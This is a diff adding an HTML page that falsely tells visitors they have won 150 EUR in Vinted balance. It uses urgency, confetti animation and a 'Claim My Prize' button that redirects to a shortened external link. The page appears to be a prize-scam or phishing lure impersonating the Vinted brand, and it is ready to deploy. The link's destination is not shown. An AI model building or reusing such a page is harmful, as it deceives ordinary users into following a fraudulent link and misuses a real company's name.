@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Congratulations! You've Won!</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="background-animation">
+        <div class="glow-orb glow-orb-1"></div>
+        <div class="glow-orb glow-orb-2"></div>
+        <div class="glow-orb glow-orb-3"></div>
+    </div>
+
+    <div class="container">
+        <div class="content">
+            <!-- Gift Icon -->
+            <div class="logo-badge">🎁</div>
+
+            <!-- Main Title -->
+            <h1>Congratulations!</h1>
+
+            <!-- Subtitle -->
+            <p class="subtitle">You've Won! 🏆</p>
+
+            <!-- Description -->
+            <p class="description">
+                You're one of our lucky winners! Click the button below to claim your 150 EUR in Vinted balance.
+            </p>
+
+            <!-- Prize Info Box -->
+            <div class="prize-container">
+                <div class="prize-icon">💰</div>
+                <div class="prize-label">Your Prize</div>
+                <div class="prize-amount">150 EUR</div>
+                <div class="prize-desc">Exclusive balance top-up - Add it to your Vinted account right now!</div>
+            </div>
+
+            <!-- CTA Button - VINTED STYLE -->
+            <button class="cta-button pulse" onclick="claimPrize()">
+                <span class="button-icon">💳</span>
+                <span class="button-text">Claim My Prize</span>
+            </button>
+
+            <!-- Footer -->
+            <div class="footer-text">
+                ✨ Limited time offer - Claim your prize now!<br>
+                <a href="#help">Need help? Contact support</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function createConfetti() {
+            const colors = ['#f1641e', '#4a5dd8', '#ffd700', '#ff1493', '#00ff00', '#ff6347'];
+            const confettiCount = 60;
+
+            for (let i = 0; i < confettiCount; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.top = '-10px';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDelay = Math.random() * 0.5 + 's';
+                confetti.style.width = (Math.random() * 8 + 4) + 'px';
+                confetti.style.height = confetti.style.width;
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                document.body.appendChild(confetti);
+
+                setTimeout(() => confetti.remove(), 3500);
+            }
+        }
+
+        function createSparkles() {
+            const sparkleCount = 40;
+
+            for (let i = 0; i < sparkleCount; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.className = 'sparkle';
+                sparkle.style.left = Math.random() * 100 + '%';
+                sparkle.style.top = Math.random() * 100 + '%';
+                sparkle.style.animationDelay = Math.random() * 2 + 's';
+                document.body.appendChild(sparkle);
+
+                setTimeout(() => sparkle.remove(), 8000);
+            }
+        }
+
+        function claimPrize() {
+            createConfetti();
+            createSparkles();
+
+            setTimeout(() => {
+                window.location.href = 'https://vly.to/c5lhTj';
+            }, 600);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            createConfetti();
+            createSparkles();
+        });
+
+        setInterval(() => {
+            createConfetti();
+        }, 4000);
+    </script>
+</body>
+</html>
